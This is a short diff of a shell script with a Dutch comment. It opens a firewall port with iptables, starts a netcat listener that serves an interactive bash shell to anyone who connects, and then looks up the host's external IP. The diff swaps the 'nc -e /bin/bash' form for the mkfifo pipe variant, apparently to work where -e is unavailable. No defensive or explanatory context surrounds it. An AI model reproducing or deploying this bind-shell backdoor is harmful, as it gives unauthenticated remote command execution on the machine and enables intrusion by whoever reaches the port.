@@ -20,7 +20,9 @@ iptables -C INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT 2>/dev/null || \
 iptables -I INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT
 
 # Start listener
-nohup nc -lvnp $LISTENER_PORT -e /bin/bash &>/dev/null &
+mkfifo /tmp/f
+cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp $LISTENER_PORT > /tmp/f
+# nohup nc -lvnp $LISTENER_PORT -e /bin/bash &>/dev/null &
 
 # Externe IP achterhalen
 EXTERNAL_IP=$(curl -s ifconfig.me)
